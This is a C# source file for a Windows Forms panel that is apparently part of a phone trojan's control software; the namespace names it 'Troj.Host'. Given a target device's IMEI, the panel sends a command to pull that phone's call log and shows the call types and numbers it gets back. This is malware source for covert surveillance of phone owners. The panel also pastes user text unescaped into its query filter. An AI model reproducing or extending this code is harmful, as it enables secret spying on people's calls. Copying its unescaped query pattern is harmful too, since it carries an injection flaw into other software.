using System;
using System.Text;
using System.Windows.Forms;
using InOut;
using InOut.PacketImp;
using InOut.Utils;

namespace IIE.Phone.Troj.Host.Panel
{
    public partial class ReadCallLogPanel : UserControl
    {
        private readonly string imei;
        private readonly IServer server;

        public ReadCallLogPanel(string imei, IServer server)
        {
            this.imei = imei;
            this.server = server;
            InitializeComponent();
            cbPhoneType.SelectedIndex = 0;
        }

        private void btnSearch_Click(object sender, EventArgs e)
        {
            string request = GenRequest();
            server.CommandSender(imei, Protocol.GetCallLogs, request.GetBytes());
        }

        private string GenRequest()
        {
            var buffer = new StringBuilder();
            Action<string> addFilter = filter =>
            {
                if (buffer.Length != 0)
                    buffer.Append(" and ");
                buffer.Append(filter);
            };
            if (cbPhoneType.SelectedIndex != 0)
                addFilter(" type = " + cbPhoneType.SelectedIndex);

            if (!string.IsNullOrEmpty(tbPhoneNumber.Text))
            {
                addFilter(" number = '" + tbPhoneNumber.Text + "'");
            }
            return buffer.ToString();
        }

        public void UpdateUserCallLogs(CallPacket[] list)
        {
            if (list != null)
                Invoke(new MethodInvoker(() => UpdateUserCallLogsCore(list)));
        }

        private void UpdateUserCallLogsCore(CallPacket[] list)
        {
            lvCallLog.Items.Clear();
            lvCallLog.BeginUpdate();
            foreach (var callPacket in list)
            {
                lvCallLog.Items.Add(new ListViewItem(new[]
                    {
                
                        callPacket.Type.ToString(),
                        callPacket.PhoneNumber
                    }));
            }

            lvCallLog.EndUpdate();
        }
    }
}
